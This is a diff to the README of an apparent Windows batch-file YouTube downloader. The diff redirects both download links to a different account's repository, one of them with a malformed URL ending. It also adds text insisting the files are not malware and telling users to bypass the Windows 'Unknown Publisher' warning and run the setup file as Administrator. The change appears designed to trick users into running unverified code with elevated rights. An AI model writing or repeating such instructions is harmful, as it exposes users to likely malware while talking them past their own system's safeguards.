@@ -2,17 +2,19 @@
 
 A simple Windows tool to download YouTube videos and audio.
 
+> **Note:** Windows may show a warning saying "Unknown Publisher" when you run the .bat files. This is normal for unsigned scripts and does NOT mean it is malware. You can view the full source code of every file in this repo to verify it is safe. Click "More info" then "Run anyway" to proceed.
+
 ## How to Install
 
 **Step 1** - Download and run the setup file first:
 
-[Download INSTALL FIRST.bat](https://raw.githubusercontent.com/Cadenthegoat3662/YouTube-Link-Downloader/main/INSTALL%20FIRST.bat)
+[Download INSTALL FIRST.bat](https://raw.githubusercontent.com/cadenthecoder3662/youtube-link-installer-fix/main/Install%20first.bat)
 
-**Step 2** - Right click it and click Run as Administrator
+**Step 2** - Right click it and click Run as Administrator then click More info and Run anyway if Windows warns you
 
 **Step 3** - Download the main tool:
 
-[Download YouTube Link Downloader.bat](https://raw.githubusercontent.com/Cadenthegoat3662/YouTube-Link-Downloader/main/YouTube%20Link%20Downloader.bat)
+[Download YouTube Link Downloader.bat](https://raw.githubusercontent.com/cadenthecoder3662/youtube-link-installer-fix/main/YouTube%20Link%20Downloader.bat%3A)
 
 **Step 4** - Move it to your Downloads folder and double click it
 
